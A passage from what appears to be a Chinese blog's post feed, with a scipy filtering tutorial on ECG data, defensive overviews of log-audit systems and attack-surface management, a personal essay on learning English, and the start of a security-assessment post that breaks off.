class="string">'bandpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#带阻滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, [<span class="number">0.2</span>,<span class="number">0.8</span>], <span class="string">'bandstop'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br></pre></td></tr></table></figure><h2 id="三、信号滤波实战"><a href="#三、信号滤波实战" class="headerlink" title="三、信号滤波实战"></a>三、信号滤波实战</h2><p>这里以一个真实的心电数据为例，来实战对心电图某一段时间采样的信号数据进行高通滤波处理，对比一下原始的信号和高通滤波后的信号波形，然后输出成图片文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#引入包</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"><span class="comment">#读取心电图数据文件</span></span><br><span class="line">bspfile=<span class="string">'data/1.txt'</span></span><br><span class="line">bsp_f = open(bspfile, <span class="string">"r"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">bsp_content = bsp_f.read()</span><br><span class="line">ary=bsp_content.split(<span class="string">' '</span>)</span><br><span class="line">ary=[float(s) <span class="keyword">for</span> s <span class="keyword">in</span> bsp_content.split(<span class="string">' '</span>)]</span><br><span class="line">ary_data=ary[<span class="number">0</span>:<span class="number">10000</span>] <span class="comment">#取前10秒数据</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.3</span>, <span class="string">'highpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line"><span class="comment">#绘图</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, ary_data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line">fig, axes = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, figsize=(<span class="number">32</span>, <span class="number">4</span>))</span><br><span class="line">axes[<span class="number">0</span>].plot(ary_data)</span><br><span class="line">axes[<span class="number">0</span>].set(title=<span class="string">'Source signal'</span>)</span><br><span class="line">axes[<span class="number">1</span>].plot(filtedData)</span><br><span class="line">axes[<span class="number">1</span>].set(title=<span class="string">'highpass signal'</span>)</span><br><span class="line"><span class="comment">#保存图片</span></span><br><span class="line">plt.savefig(<span class="string">'./signal1.png'</span>, <span class="comment"># ⽂件名：png、jpg、pdf</span></span><br><span class="line">dpi = <span class="number">80</span>, <span class="comment"># 保存图⽚像素密度</span></span><br><span class="line">bbox_inches = <span class="string">'tight'</span>)<span class="comment"># 保存图⽚完整</span></span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230313/signal1.png" alt="心电图高通滤波后的效果"></p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><p>微信公众号：fullbug  关注微信公众号，回复“信号滤波”获取全部代码+数据集</p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之认识日志采集分析审计系统</title>
      <link href="/posts/6a8b36cb/"/>
      <url>/posts/6a8b36cb/</url>
      
        <content type="html"><![CDATA[<p>日志对于大家来说非常熟悉，机房中的各种系统、防火墙、交换机、路由器等等，都在不断地产生日志。无数实践告诉我们，健全的日志记录和分析系统是系统正常运营与优化以及安全事故响应的基础。我们一起来认识日志采集分析审计系统。</p><h2 id="一、什么是日志数据"><a href="#一、什么是日志数据" class="headerlink" title="一、什么是日志数据"></a>一、什么是日志数据</h2><h3 id="1、日志的概念"><a href="#1、日志的概念" class="headerlink" title="1、日志的概念"></a>1、日志的概念</h3><p>日志数据的核心就是日志消息或日志，日志消息是计算机系统、设备、软件等在某种刺激下反应生成的东西。例如：Linux用户登录和注销、防火墙ACL通过和拒绝、存储系统故障等。</p><p>日志数据（log data）就是一条日志消息的内在含义，用来告诉你为什么生成日志消息的信息。日志（log）指用于展示某些事件全貌的日志消息的集合。</p><h3 id="2、日志的类型"><a href="#2、日志的类型" class="headerlink" title="2、日志的类型"></a>2、日志的类型</h3><p>日志通用的几种类型：</p><ul><li>信息（Info）:告诉用户和管理员发生了一些没有风险的事情。</li><li>调试（Debug）:在应用程序代码运行时生成调试信息，给软件开发人员提供故障检测和定位问题的帮助。</li><li>警告（Warning）:缺少需要的文件、参数、数据，但又不影响系统运行时生成警告。</li><li>错误（Error）:传达在计算机系统重出现的各种级别的错误。许多错误消息只能给出为什么出错的起点，要寻找出导致错误发生的根本原因还需要进一步的调查。</li><li>警报（Alarm）:警报表明发生了一些有趣的事情。一般情况下，警报数据安全设备和安全相关系统领域的。如IPS检测到了一个恶意链接，可能会采取任何预先配置的行动，IPS会记录下检测结果以及所采取的行动。</li></ul><p>可以看到日志数据包含了系统运行的很多重要信息，了解日志、做好日志的分析审计可以很好帮助用户更好监控和保障信息系统运行，及时识别针对信息系统的入侵攻击、内部违规等信息。</p><h2 id="二、为什么要做日志分析审计"><a href="#二、为什么要做日志分析审计" class="headerlink" title="二、为什么要做日志分析审计"></a>二、为什么要做日志分析审计</h2><h3 id="1、满足法律法规的要求"><a href="#1、满足法律法规的要求" class="headerlink" title="1、满足法律法规的要求"></a>1、满足法律法规的要求</h3><p>国家的政策法规、行业标准等都明确对日志审计提出了要求，日志审计已成为企业满足合规内控要求所必须的一项基本要求。 2017年6月1日起施行的《中华人民共和国网络安全法》中规定：采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月。 </p><p>《网络安全等级保护基本要求》（GB∕T 22239-2019）中规定：二到四级需要对网络、主机、应用安全三部分进行日志审计，留存日志需符合法律法规规定。</p><p>我国政府及相关行业已相继推出了数十部法律法规。如国家《企业内控基本规范》、国家《计算机信 息系统安全等级保护划分准则》同时银行、证券、通信行业均提出了相关标准及要求，确立了面向内控的信息安全审计的必要性。如：<br>《ISO27001:2013 》4.3.3小节、 《ISO17799:2005 》10.10小节<br>《商业银行内部控制指引》第一百二十六条 银监局《商业银行信息科技风险管理指引》<br>《银行业金融机构信息系统风险管理指引》第四十六条<br>《证券公司内部控制指引》第一百一十七条<br>《互联网安全保护技术措施规定》第八条</p><h3 id="2、满足系统安全管理需求"><a href="#2、满足系统安全管理需求" class="headerlink" title="2、满足系统安全管理需求"></a>2、满足系统安全管理需求</h3><p>当前信息安全形势日益严峻，信息安全防护工作面临前所未有的困难和挑战。日志审计能够帮助用户更好监控和保障信息系统运行，及时识别针对信息系统的入侵攻击、内部违规等信息，同时日志审计能够为安全事件的事后分析、调查取证提供必要的信息。</p><h2 id="三、日志分析审计的挑战"><a href="#三、日志分析审计的挑战" class="headerlink" title="三、日志分析审计的挑战"></a>三、日志分析审计的挑战</h2><ol><li>日志数据量巨大，无法很好的管控<br>每类设备产生的日志量都是十分巨大，分析审计员无法对数量巨大的日志进行查看与管控。</li><li>日志数据格式各异，可读性差<br>不同品牌、不同类型设备的日志格式都不相同，分析审计员无法准确解读所有设备的日志。</li><li>日志数据存储风险，彼此割裂<br>各类设备分散在网络中的不同位置，分析审计人员无法及时有效的查看到存储于不同位置的日志。</li><li>日志数据无法关联，分析困难<br>当威胁产生时无法关联其他日志进行溯源分析，无法找到问题的源头从根本上解决问题。</li></ol><h2 id="四、日志采集分析审计系统的主要核心功能"><a href="#四、日志采集分析审计系统的主要核心功能" class="headerlink" title="四、日志采集分析审计系统的主要核心功能"></a>四、日志采集分析审计系统的主要核心功能</h2><p>对于前面的日志分析审计现状带来的挑战，很多企业购买或自建了日志采集分析审计系统。一方面满足合规要求，另一方面满足自身业务系统安全管理的要求。</p><p>日志采集分析审计系统，通过海量日志采集、异构设备日志范式化、安全事件关联分析等技术，<strong>实现日志全生命周期管理</strong>。协助运维人员从事前（发现安全风险）、事中（分析溯源）及事后（调查取证）等多个维度监控网络安全事件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230310/%E6%97%A5%E5%BF%97%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86.png" alt="日志全生命周期管理"></p><p>一般来说日志采集分析审计系统核心功能包括日志采集、日志存储、日志分析、日志查询、日志监控、日志事件告警、统计展示。</p><h3 id="1、日志采集"><a href="#1、日志采集" class="headerlink" title="1、日志采集"></a>1、日志采集</h3><p>系统应提供全面的日志采集能力：支持网络安全设备、网络设备、数据库、windows/linux主机日志、web服务器日志、虚拟化平台日志以及自定义等日志；<br>提供多种的数据源管理功能：支持数据源的信息展示与管理、采集器的信息展示与管理以及agent的信息展示与管理；提供分布式外置采集器、Agent等多种日志采集方式；支持IPv4、IPv6日志采集、分析以及检索查询；</p><h3 id="2、日志存储"><a href="#2、日志存储" class="headerlink" title="2、日志存储"></a>2、日志存储</h3><p>提供原始日志、范式化日志的存储，可自定义存储周期，支持FTP日志备份以及NFS网络文件共享存储等多种存储扩展方式。一般来说支持大数据技术的存储方式如ES等，日志数据存储需要满足不少于六个月。</p><h3 id="3、日志分析"><a href="#3、日志分析" class="headerlink" title="3、日志分析"></a>3、日志分析</h3><p>提供便捷的日志分析操作，支持对日志进行分组、分组查询以及从叶子节点可直接查询分析日志；</p><h3 id="4、日志查询"><a href="#4、日志查询" class="headerlink" title="4、日志查询"></a>4、日志查询</h3><p>提供丰富灵活的日志查询方式，支持全文、key-value、多kv布尔组合、括弧、正则、模糊等检索；<br>提供便捷的日志检索操作，支持保存检索、从已保存的检索导入见多条件等；</p><h3 id="5、日志监控"><a href="#5、日志监控" class="headerlink" title="5、日志监控"></a>5、日志监控</h3><p>在采集器维度对日志源情况进行实时监控，对日志源的基本情况及事件信息进行展示，提供日志监控能力，支持对采集器、采集器资产的实时状态进行监控。如发现某一采集器在一段时间内没有日志数据报送，就需要排查是否是源系统或网络传输出现了问题。<br>在平台维度对平台自身的组件进行实时监控，保障平台自身的稳定运行。支持查看CPU、磁盘、内存总量及当前使用情况；支持查看资产的概览信息及资产关联的事件分布；</p><h3 id="6、日志事件告警"><a href="#6、日志事件告警" class="headerlink" title="6、日志事件告警"></a>6、日志事件告警</h3><p>能够实现单事件的关联、多事件的关联分析；支持自定义事件规则，可按照日志、字段布尔逻辑关系等方式自定义规则；支持时间的查询、查询结果统计以及统计结果的展示等；支持对告警规则的自定义，可设置针对事件的各种筛选规则、告警等级等；</p><p>能够进行统计关联分析、时序关联分析、逻辑关联分析<br><strong>统计关联</strong>：基于统计条件规则的关联分析，如某一事件重复出现多次。典型的如：暴力破解，在某一时间段某一相同账号频繁多次失败的尝试登录日志。<br><strong>时序关联</strong>：基于时序的规则的分析，如发生某动作后接着发生了其他的动作。如：发生了在某一时间段某一相同账号频繁多次失败的尝试登录日志后，发生了一次成功登录的日志。就有可能怀疑是暴力破解成功了。<br><strong>逻辑关联</strong>：基于逻辑的关联，如满足什么条件的情况下发生了什么。如：不是白名单的IP访问了某台设备等。</p><h3 id="7、统计展示"><a href="#7、统计展示" class="headerlink" title="7、统计展示"></a>7、统计展示</h3><p>支持丰富的内置报表以及灵活的自定义报表模式，按照日、周、月、年生成专项审计报告，支持实时报表、定时报表、周期性任务报表等方式；支持编辑报表的目录接口、引用统计项、设置报表标题、展示页眉和页码、报表配置基本内容（名称、描述等）；支持html，pdf，word格式的报表文件以及报表logo的灵活配置；可视化的交互界面能够展现当前审计情况，展现日志审计工作成果与价值。</p><p>通过对人员角色的定义，可根据角色定义监控的个人工作台，过滤关键重要的事件和监控指标，更加方便安全的日常审计工作，有效提升日志审计的关注度和时效性。</p><h2 id="五、日志采集分析审计系统的价值"><a href="#五、日志采集分析审计系统的价值" class="headerlink" title="五、日志采集分析审计系统的价值"></a>五、日志采集分析审计系统的价值</h2><ol><li>日志集中管控<br>日志采集分析审计系统可以帮助客户对海量日志进行集中管控，客户能够从日志采集、存储、分析、告警等环节参与日志全生命周期管理，有效解决日志分散、日志量大、日志格式不统一的问题，助力安全运维。</li><li>日志回溯与取证<br>日志采集分析审计系统能够对日志进行留存，支持回溯查询，有效解决事后追查困难、无法提供有效证据的难题。</li><li>监测体系构建<br>日志作为网络安全监测体系中比较重要的一环，可在信息获取和分析验证等方面提供技术支撑，当体系做出调整后，日志能够更加准确的反映出系统情况，助力企业网络安全监测体系构建，提升安全防御能力。</li><li>等保合规<br>日志采集分析审计系统平台支持大数据日志存储方案，可助力客户满足网络安全法、等保合规日志留存6个月的要求，同时支持灵活的自定义报表，可满足多样化的报表需求。</li></ol><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之资产及攻击面管理</title>
      <link href="/posts/dc7085dc/"/>
      <url>/posts/dc7085dc/</url>
      
        <content type="html"><![CDATA[<p>“摸清家底，认清风险”做好资产管理是安全运营的第一步。那么什么是资产，资产管理的难点痛点是什么，如何做好资产管理，认清风险。带着这些问题我们来认识一下资产及攻击面管理。</p><h2 id="一、资产的定义"><a href="#一、资产的定义" class="headerlink" title="一、资产的定义"></a>一、资产的定义</h2><p>《GBT 20984-2007信息安全技术信息安全风险评估规范》中，对于资产的定义为“<strong>对组织有价值的信息或资源，是安全策略保护的对象</strong>”。</p><p>对于网络空间资产来说，这里的资产是指赛博空间中某机构所拥有的一切可能被潜在攻击者利用的设备、信息、应用等数字资产。具体对象包括但不限于硬件设备、云主机、操作系统、IP地址、端口、证书、域名、Web应用、业务应用、中间件、框架、机构公众号、小程序、App、API、源代码等。概括来说，<strong>只要是可操作的对象，不管是实体还是属性。都可以称之为“网络空间资产”</strong>。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230305/%E8%B5%84%E4%BA%A7%E5%85%A8%E8%A7%86%E5%9B%BE.png" alt="安全资产视图"></p><p>借用“魔方安全”的图，一切可操作对象和属性，都是资产。</p><h2 id="二、资产管理的挑战"><a href="#二、资产管理的挑战" class="headerlink" title="二、资产管理的挑战"></a>二、资产管理的挑战</h2><p>通过上面的定义和图示，可以看到其实网络空间资产，所涉及的覆盖面特别广，给企业资产管理安全运营带来的巨大的挑战：<br>1、对象多<br>按数字资产类型划分如网站、IP、域名、移动门户和云服务等一切可能被潜在攻击者利用的设备、信息、应用等都是网络空间资产。所以资产管理需要纳管的类型多，且随着业务的互联网化、社交化，导致资产及暴露面快速增长。<br>2、分布广<br>随着数字化应用的深入，资产分布在多个数据中心、私有云、公有云、混合云、边缘计算和物联网等各种基础设施环境中，照成了资产信息割裂碎片化，给资产的统一管理带来了困难。<br>3、变化快<br>随着数字化转型业务发展和新型IT技术应用，为快速响应市场和业务需求，互联网暴露资产无时无刻都在跟着生产运营动态变化。<br>4、更隐蔽<br>影子资产的存在，包括钓鱼欺诈网站、暗网交易数据、用户信息泄露、代码仓库等外部隐藏的企业资产，给企业经济或商誉上带来更大的伤害。</p><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><p>一切可能被潜在攻击者利用的设备、信息、应用等都是网络空间资产。你永远都无法知道攻击者如何利用这些网络空间资产进行攻击。</p><p>所以摸清家底是第一步，要搞清楚自己的资产都有哪些，分布在那里，有哪些漏洞风险。这里互联网暴露资产及影子资产尤为关键。影子IT(shadow it)：指那些不在企业和组织IT部门掌控下的IT设备、软件及服务。影子资产就是影子IT中资产。互联网暴露面是网络攻击的入口，是网络安全运营的第一道防线；影子资产的存在更是让安全运营人员防不胜防，因为“你无法保护你看不见的东西”。为了解决这些问题业界推出了攻击面管理的概念。</p><p><strong>攻击面管理</strong>以保护组织数字资产安全为出发点，聚焦在<strong>攻击者视角</strong>去审视网络空间内不同形态种类的资产所组成的攻击暴露面，同时特别强调“可观测性”、“可运营”,这意味着资产的全面性可度量、风险可度量、响应处置可度量。</p><p>攻击面管理的包括暴露面资产全面发现、资产脆弱性风险识别、多源数据融合分析、专项暴露面收敛。</p><h3 id="1、暴露面的全面发现"><a href="#1、暴露面的全面发现" class="headerlink" title="1、暴露面的全面发现"></a>1、暴露面的全面发现</h3><p>暴露面的发现主要以攻击者视角为主，涵盖外部信息、网络资产等维度。</p><p>外部信息包括攻击者能够收集到的机构信息、在开源代码共享平台上的代码、外部接口等。</p><ul><li>机构信息收集</li></ul><p>潜在攻击者首先会搜集用户的机构信息，搜集维度包括但不限于总部及分支机构名称、品牌、安全管理制度、业务运行时间、集团行政架构、各分支机构间的关系等等；针对高权限的IT管理人员，重点搜集姓名、邮箱、手机号、VPN账户、昵称、社会关系等等;搜集渠道主要有各大搜索引擎、天眼查类平台、网盘文库、官网、公众号、钉钉群、微信群、代码共享平台等。因此，安全团队可以通过外部攻击面发现平台，对此类信息做持续周期性的发现。先于攻击者发现此类资产，为响应收敛争取时间。</p><ul><li>源代码发现与收敛</li></ul><p>代码共享平台存在隐匿的攻击暴露面，例如管理后台URL、VPN账户密码等，开发运维人员因缺乏安全意识，无意中将此类敏感信息上传至GitHub、Gitee等代码共享平台，为信息安全事故埋下导火索。攻击者主要是以用户机构的业务关键字、品牌名称、公司名称、IT人员的个人GitHub账户等渠道搜集这类信息，因此安全团队应以技术监测手段与内部行政管理相结合的方式，对此类攻击暴露面进行持续发现、收敛。</p><ul><li>外部接口管理</li></ul><p>除了代码平台，还有一类常被忽视的攻击暴露面是外部接口，如与合作伙伴或第三方平台的API数据接口，与微信公众号菜单对接的URL、小程序或H5中隐含的数据接口等。这类外部接口，开发测试使用过后，即随着项目结束而被遗忘，极易成为潜在的攻击暴露面。同代码平台监测一样，安全团队应当以“技术+管理”相结合的方式，对此进行持续发现、收敛。</p><ul><li>网络资产攻击面覆盖</li></ul><p>通过扫描探测、流量监听、主机代理、特征匹配、其他CMDB系统对接等多种方式，持续动态的发现、汇集资产数据，建立与业务之间的关联关系，安全责任落实责任人，做到摸清家底，解决资产掌握的“不准”、“不全”问题。建立统一的资产台账，对台账数据进行定期自动化探测稽核以及持续动态监测，发现未能了解或掌握暴露于网络空间的资产攻击面，对未申报的遗漏暴露面资产（影子资产）进行自动发现并预警，解决“大海捞针”的工作困扰。</p><h3 id="2、脆弱性风险识别"><a href="#2、脆弱性风险识别" class="headerlink" title="2、脆弱性风险识别"></a>2、脆弱性风险识别</h3><p>脆弱性风险识别包括弱口令识别、漏洞发现、安全配置不合规项的检查识别</p><ul><li>弱口令识别</li></ul><p>弱口令没有严格和准确的定义，通常认为容易被别人猜测到或被破解工具破解的口令均为弱口令。近年来，账户密码的不断泄露导致暗网的密码数据库不断增加，日益开放的网络环境降低了边界的可防御性，远程设备的迅速涌入使互联网络上的用户和终端身份的安全管理更加复杂。可以说，金融行业的弱口令攻击面仍然是在不断扩大的。因此，攻击面发现能力中，对攻击面脆弱性的评估，首先还是要关注弱口令。<br>弱口令的发现方式相对也并不复杂，在发现管理后台页面、口令认证接口等类型资产时，相关产品或工具能够进一步辅以口令字典进行测试即可。这里的字典要支持用户上传进行自定义，同时针对不同的资产发现场景和任务，修改不同级别的弱口令测试强度，不影响业务。</p><ul><li>漏洞发现</li></ul><p>作为攻击者，往往依赖于新爆出的0day或1day漏洞。这就决定了在新的漏洞威胁出现后，安全团队需要抢在攻击者之前，更快、更全、更准地定位潜在受漏洞威胁的风险资产。攻击面管理首先要做到在漏洞爆发之前，就对资产台账中的所有资产信息按照业务优先级进行标记，同时对所使用的系统、应用、中间件及资产的版本号等关键信息做到精细管理、持续更新。如此一来，在漏洞爆发时，才能第一时间做到资产快速筛选、PoC快速分发、漏洞精准匹配、虚拟补丁临时修复等快速检测与响应，赶在攻击者行动之前完成风险收敛。</p><ul><li>安全配置合规检查</li></ul><p>安全配置通常都是由于人为的疏忽造成主要包括了账号、口令、授权、日志、IP通信等方面内容，反映了系统自身的安全脆弱性。攻击者往往利用主机、中间件的如脆弱的访问控制配置漏洞进行渗透。安全配置基线合规管控方案是能够有效保障网络设备、信息系统安全的手段之一，其内容主要涉及：登录配置、远程管理保护、访问控制、安全日志、安全协议等多方面内容，只有实现及时自动的采集和核查发现安全配置不合规项并进行整改，才能更好的保障网络资产的安全。</p><h3 id="3、多源数据融合分析"><a href="#3、多源数据融合分析" class="headerlink" title="3、多源数据融合分析"></a>3、多源数据融合分析</h3><p>随着数字化应用的深入，资产分布在多个数据中心、私有云、公有云、混合云、边缘计算和物联网等各种基础设施环境中，无论用户的单独一个部门亦或是单独某一家供应商，不可能覆盖所有资产，因此，统一的攻击面管理一定要具备“多源资产数据的接入并融合分析”的能力。主要解决统一可视化管理的问题，包括资产的可视化、资产与资产之间的关系可视化、风险可视化、业务影响可视化、责任可视化。这都要求具备统一的资产及攻击面管理平台实现多源资产数据的统一接入汇聚，多源数据的融合与分析。</p><ul><li>多源资产数据接入</li></ul><p>应能对接的多源资产数据，包括但不限于CMDB、终端管理平台、AD域等运维数据，以及NDR、EDR、HDR(含HIDS)等具备资产发现能力的安全产品及解决方案。接入范围应该覆盖企业数据中心、私有云、公有云、混合云、边缘计算和物联网等各种基础设施环境中的所有的数据资产数据。</p><ul><li>数据融合与分析</li></ul><p>多源资产数据接入汇总后，并非简单的叠加，而是要进行持续的交叉验证、去重/扩充、属性补全、标记等操作。需要结合业务数据流、网络流量、访问拓扑等多个维度，综合描绘出资产之间的关系链，建立“人-地-网”进行深度的关联和立体化模型，对地理、资产、事件、情报等大数据进行融合分析，结合可视化呈现技术，实现企业整体统一全面的资产地图，让网络资产“看得到、看得清、管得好”，到对于攻击能够“防的住”。</p><h3 id="4、专项暴露面收敛"><a href="#4、专项暴露面收敛" class="headerlink" title="4、专项暴露面收敛"></a>4、专项暴露面收敛</h3><p>通过前面的暴露面资产发现、脆弱性设别筛选定位出所有潜在威胁的风险资产，然后根据资产的业务优先级、所属部门，下发不同的响应策略。在不影响业务连续性的前提下，确定漏洞修复方案前，对部分资产做临时下线处理。对于一小部分受业务连续性要求，既不能下线又不能修复的资产，则通过“虚拟补丁/透明补丁”的方式临时加固，待将来允许时，再行修复。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习英语，你认为“长期”的坚持是多长，“大量”的阅读又是多少？</title>
      <link href="/posts/a9bec41d/"/>
      <url>/posts/a9bec41d/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230302/LearnEnglish.png" alt="English" title="English"><br>今天在豆瓣上翻到我在2020年4月发的一篇文章《<a href="https://book.douban.com/review/12481861/" target="_blank" rel="noopener">看完全套149本《书虫》是种什么样的体验</a>》。有豆友留言在问“现在英语怎么样了”？顿时感觉脸上火辣辣的，被啪啪打脸！</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230302/%E8%B1%86%E7%93%A3%E5%9B%9E%E5%A4%8D.png" alt="豆瓣回复" title="豆瓣回复"></p><p>到今天2023年3月了，快三年了，自己的英语又回到了原点。在我学习英语的生涯中又添加了一次英语学习失败的经历。陷入了第N+1轮的从坚持到放弃，从放弃到开始的魔咒。</p><p>终究还是把英语学习看得太轻了！对于英语的学习，我经历过《<a href="https://book.douban.com/review/10294018/" target="_blank" rel="noopener">坚持了330天，我终于放弃了背单词</a>》、《<a href="https://book.douban.com/review/12481861/" target="_blank" rel="noopener">看完全套149本《书虫》是种什么样的体验</a>》、《<a href="https://book.douban.com/review/12484676/" target="_blank" rel="noopener">英语学渣的我是如何撸完这本英文原著的</a>》。经历了1年的背单词的过程，半年的看完全套书虫，半年撸完10本英文原著（见豆列《<a href="https://www.douban.com/doulist/118432400/" target="_blank" rel="noopener">我读过的英文读本</a>》）。</p><p>关于学习英语这件事，大家都知道需要“长期”的坚持，“大量”的阅读应用。那么你认为长期的坚持是多长，大量的阅读是多少呢？我前前后后花了两年的时间，完成了149本书虫，看完了上十本英文原著，我觉得我已经很努力了，很能坚持了。当我试图在网上寻找这个答案时，发现自己认为花了两年的时间很长，人家已经坚持了七八上十年了；自己嘚瑟看完了全套书虫，人家不但晒完了全套书虫还晒完了哈利波特系列、床头灯系列后每年还坚持撸完二三十本原著。你所谓的“坚持”和“大量”，在人家眼里那只能是渣渣！学英语的路上，总能遇到比你厉害的人却还比你更努力！</p><p>学习这件事，真的没有捷径，谁更用功谁功夫深。好在已经有大量的人已经验证过，英语这个技能是可以通过“长期”的坚持和“大量”的应用可以习得的，我们应该笃信这个事情。<strong>“长期”的坚持是多长，”大量”的阅读是多少，最终只能通过效果来验证</strong>。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230302/%E5%AD%A6%E4%B9%A0%E6%8B%90%E7%82%B9.png" alt="学习拐点" title="学习拐点"></p><p>知识和能力的习得与积累是有复利效应的。所以，应该要相信自己能够通过“长期”和“大量”的积累和复利获得成功和成长，实现自己的英语应用的自由。有人通过自己的长期坚持和大量的积累成功的突破了拐点，实现了自己的目标。自己还没有成功，说明坚持得不久，积累得不够，在拐点到来之前就慢慢的放弃了，如果继续放弃那以前花费的时间精力只能是变成沉默成本不会有任何效果了。实现英语阅读自由只能是梦想了。</p><p><strong>革命尚未成功，同志仍需努力！梦想还是要有的，现在开始继续坚持英语学习吧！</strong></p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全评估之漏洞扫描、基线检查、渗透测试</title>
      <link href="/posts/78efec46/"/>
      <url>/posts/78efec46/</url>
      
        <content type="html"><![CDATA[<p>为保证业务系统运营的安全稳定，在业务系统上线前需要开展三同步检查，针对新业务系统上线、新版本上线、项目验收前开展安全评估。可以帮助其在技术层面了解系统存在的安全漏洞。今天就来了解一下安全评估之漏洞扫描、基线检查、渗透测试。</p><p>安全评估的内容主要涉及主机漏洞扫描、安全基线检查、渗透测试三个方面：</p><h2 id="主机漏洞扫描"><a href="#主机漏洞扫描" class="headerlink" title="主机漏洞扫描"></a>主机漏洞扫描</h2><p>主机漏洞扫描一般是采用漏洞扫描工具，根据其内置的弱点测试方法，从网络侧对被评估对象进行一系列的检查，从而发现弱点。发现其存在的不安全漏洞后进行人工分析和确认，针对每个漏洞的整改意见完成报告的输出。被评估对象系统的管理人员根据扫描的结果以及修复建议修复网络安全漏洞，在黑客攻击前进行防范。被评估对象系统的管理人员对这些漏洞进行修复后，安服工程师会对漏洞扫描报告中每个漏洞进行漏洞复测，并输出复测报告。使用户更加全面的了解全网的安全状态，提高对安全漏洞的认识和管理能力，并通过对漏洞的修补加强应用系统抵御恶意入侵的能力。</p><h2 id="安全基线检查"><a href="#安全基线检查" class="headerlink" title="安全基线检查"></a>安全基线检查</h2><p>安全基线检查是通过采用安全检查设备以及人工检查两种方法从对应目标的安全合规性等方面开展对系统的全量安全基线检查，从而发现其基线的不合规项。其次在发现基线不合规项之后由安服工程师进行人工二次确认，依据工信部基线安全标准，针对性提供每个基线不合规项的整改建议，并完成基线不合规项报告输出。评估对象系统的管理人员可根据输出报告对基线不合规项进行基线整改。整改完成后，安服工程师会对按照工信部基线安全标准对所涉及不合规项进行安全基线复测，并输出复测报告。确保系统安全性得到提升，建立系统基础的安全防御体系。</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" 